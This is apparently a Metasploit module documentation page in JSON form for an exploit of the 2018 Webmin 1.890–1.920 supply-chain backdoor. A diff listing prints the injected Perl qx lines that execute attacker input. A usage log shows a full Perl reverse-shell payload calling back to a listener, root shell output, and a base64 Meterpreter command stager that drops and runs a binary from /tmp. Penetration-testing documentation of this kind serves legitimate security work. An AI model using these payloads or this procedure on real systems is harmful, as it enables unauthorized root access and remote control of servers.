{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/webmin_backdoor","result":{"data":{"moduleMetadataJson":{"id":"d82a8b34-aa31-56a6-b21f-00dbcc472d92","name":"Webmin password_change.cgi Backdoor","fullname":"exploit/linux/http/webmin_backdoor","description":"This module exploits a backdoor in Webmin versions 1.890 through 1.920.\n        Only the SourceForge downloads were backdoored, but they are listed as\n        official downloads on the project's site.\n\n        Unknown attacker(s) inserted Perl qx statements into the build server's\n        source code on two separate occasions: once in April 2018, introducing\n        the backdoor in the 1.890 release, and in July 2018, reintroducing the\n        backdoor in releases 1.900 through 1.920.\n\n        Only version 1.890 is exploitable in the default install. Later affected\n        versions require the expired password changing feature to be enabled.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/webmin_backdoor","documentationSlug":"/modules/documentation/exploit/linux/http/webmin_backdoor","referencesSlug":"/modules/references/exploit/linux/http/webmin_backdoor"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module exploits a backdoor in Webmin versions 1.890 through 1.920.\nOnly the SourceForge downloads were backdoored, but they are listed as\nofficial downloads on the project's site.</p>\n<p>Unknown attacker(s) inserted Perl <code class=\"language-text\">qx</code> statements into the build server's\nsource code on two separate occasions: once in April 2018, introducing\nthe backdoor in the 1.890 release, and in July 2018, reintroducing the\nbackdoor in releases 1.900 through 1.920.</p>\n<p>Only version 1.890 is exploitable in the default install. Later affected\nversions require the expired password changing feature to be enabled.</p>\n<h2 id=\"analysis\" style=\"position:relative;\"><a href=\"#analysis\" aria-label=\"analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Analysis</h2>\n<p>The backdoored code can compared across space and time with <code class=\"language-text\">diff3(1)</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">wvu@kharak:~/Downloads$ diff3 webmin-1.{890,930,920}/password_change.cgi\n====2\n1:1c\n3:1c\n  #!/usr/bin/perl\n2:1c\n  #!/usr/local/bin/perl\n====1\n1:12c\n  $in{&#39;expired&#39;} eq &#39;&#39; || die $text{&#39;password_expired&#39;},qx/$in{&#39;expired&#39;}/;\n2:12c\n3:12c\n  $miniserv{&#39;passwd_mode&#39;} == 2 || die &quot;Password changing is not enabled!&quot;;\n====3\n1:40c\n2:40c\n  \t$enc eq $wuser-&gt;{&#39;pass&#39;} || &amp;pass_error($text{&#39;password_eold&#39;});\n3:40c\n  \t$enc eq $wuser-&gt;{&#39;pass&#39;} || &amp;pass_error($text{&#39;password_eold&#39;},qx/$in{&#39;old&#39;}/);\n====3\n1:200c\n2:200c\n  # Show ok page\n3:200c\n\nwvu@kharak:~/Downloads$</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<ol>\n<li><code class=\"language-text\">wget https://prdownloads.sourceforge.net/webadmin/webmin-1.890.tar.gz</code></li>\n<li><code class=\"language-text\">tar xf webmin-1.890.tar.gz</code></li>\n<li><code class=\"language-text\">cd webmin-1.890</code></li>\n<li><code class=\"language-text\">./setup.sh</code></li>\n</ol>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Id  Name\n--  ----\n0   Automatic (Unix In-Memory)\n1   Automatic (Linux Dropper)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>RPORT</strong></p>\n<p>Set this to the Webmin port. The default is 10000.</p>\n<p><strong>TARGETURI</strong></p>\n<p>Set this to the Webmin base path. The default is <code class=\"language-text\">/</code>.</p>\n<p><strong>ForceExploit</strong></p>\n<p>Set this to <code class=\"language-text\">true</code> to override the <code class=\"language-text\">check</code> result during exploitation.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/webmin_backdoor) &gt; run\n\n[*] Started reverse TCP handler on 172.28.128.1:4444\n[*] Webmin 1.890 detected\n[+] Webmin 1.890 is a supported target\n[+] Webmin executed a benign check command\n[*] Configuring Automatic (Unix In-Memory) target\n[*] Sending cmd/unix/reverse_perl command payload\n[*] Generated command payload: perl -MIO -e &#39;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,&quot;172.28.128.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};&#39;\n[*] Command shell session 1 opened (172.28.128.1:4444 -&gt; 172.28.128.5:58374) at 2019-08-21 16:49:24 -0500\n\nid\nuid=0(root) gid=0(root) groups=0(root)\nuname -a\nLinux ubuntu-xenial 4.4.0-141-generic #167-Ubuntu SMP Wed Dec 5 10:40:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n^Z\nBackground session 1? [y/N]  y\nmsf5 exploit(linux/http/webmin_backdoor) &gt; set target 1\ntarget =&gt; 1\nmsf5 exploit(linux/http/webmin_backdoor) &gt; run\n\n[*] Started reverse TCP handler on 172.28.128.1:4444\n[*] Webmin 1.890 detected\n[+] Webmin 1.890 is a supported target\n[+] Webmin executed a benign check command\n[*] Configuring Automatic (Linux Dropper) target\n[*] Sending linux/x64/meterpreter/reverse_tcp command stager\n[*] Generated command stager: [&quot;echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+QAAAAAAAAB6AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UmoKQVlWUGopWJlqAl9qAV4PBUiFwHg7SJdIuQIAEVysHIABUUiJ5moQWmoqWA8FWUiFwHklSf/JdBhXaiNYagBqBUiJ50gx9g8FWVlfSIXAecdqPFhqAV8PBV5aDwVIhcB47//m&gt;&gt;&#39;/tmp/FgFBP.b64&#39; ; ((which base64 &gt;&amp;2 &amp;&amp; base64 -d -) || (which base64 &gt;&amp;2 &amp;&amp; base64 --decode -) || (which openssl &gt;&amp;2 &amp;&amp; openssl enc -d -A -base64 -in /dev/stdin) || (which python &gt;&amp;2 &amp;&amp; python -c &#39;import sys, base64; print base64.standard_b64decode(sys.stdin.read());&#39;) || (which perl &gt;&amp;2 &amp;&amp; perl -MMIME::Base64 -ne &#39;print decode_base64($_)&#39;)) 2&gt; /dev/null &gt; &#39;/tmp/tDGmH&#39; &lt; &#39;/tmp/FgFBP.b64&#39; ; chmod +x &#39;/tmp/tDGmH&#39; ; &#39;/tmp/tDGmH&#39; ; rm -f &#39;/tmp/tDGmH&#39; ; rm -f &#39;/tmp/FgFBP.b64&#39;&quot;]\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (3021284 bytes) to 172.28.128.5\n[*] Meterpreter session 2 opened (172.28.128.1:4444 -&gt; 172.28.128.5:58376) at 2019-08-21 16:49:33 -0500\n[*] Command Stager progress - 100.00% done (819/819 bytes)\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 10.0.2.15\nOS           : Ubuntu 16.04 (Linux 4.4.0-141-generic)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"d82a8b34-aa31-56a6-b21f-00dbcc472d92"}}}